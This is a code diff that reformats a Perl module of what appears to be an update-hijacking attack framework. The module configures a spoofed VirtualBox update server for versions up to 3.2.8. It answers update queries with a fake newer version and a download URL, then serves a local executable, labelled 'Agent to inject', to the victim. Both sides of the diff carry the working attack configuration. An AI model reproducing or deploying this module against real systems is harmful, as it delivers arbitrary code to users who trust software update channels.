@@ -27,52 +27,56 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'VirtualBox',
-    'appver' => '<= 3.2.8 r64453',
-    'version' => '1.1',
-    'author' => [ 'Andres Pazos < apazos +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => 'update.virtualbox.org',
-    'request' => [
-		    {
-		    'req' => '/query.php', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',
-		    'string' => '<%VERSION%> http://update.virtualhost.org/update<%RND1%>.exe',
-		    'parse' => '1',
-		    'file' => ''
-		    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'VirtualBox',
+    'appver'      => '<= 3.2.8 r64453',
+    'version'     => '1.1',
+    'author'      => ['Andres Pazos < apazos +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => 'update.virtualbox.org',
+    'request'     => [
+        {   'req'    => '/query.php',    #regex friendly
+            'type'   => 'string',        #file|string|agent|install
+            'method' => '',              #any
+            'bin'    => '',
+            'string' =>
+                '<%VERSION%> http://update.virtualhost.org/update<%RND1%>.exe',
+            'parse' => '1',
+            'file'  => ''
+        },
+        {   'req'    => '.exe',          #regex friendly
+            'type'   => 'agent',         #file|string|agent|install
+            'method' => '',              #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
+
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'version'  => { 'val' => "'5.'.isrcore::utils::RndNum(3).'.'.isrcore::utils::RndNum(1)",
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'rnd1'  => {  'val' => '"A"x10',
-                                  'hidden' => 1,
-                            	  'dynamic' =>1,
-                            },			    	  
-			    	  
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val' =>
+                "'5.'.isrcore::utils::RndNum(3).'.'.isrcore::utils::RndNum(1)",
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => '"A"x10',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+
+    }
 };
-
-
 
 ##########################################################################
 # FUNCTION      new
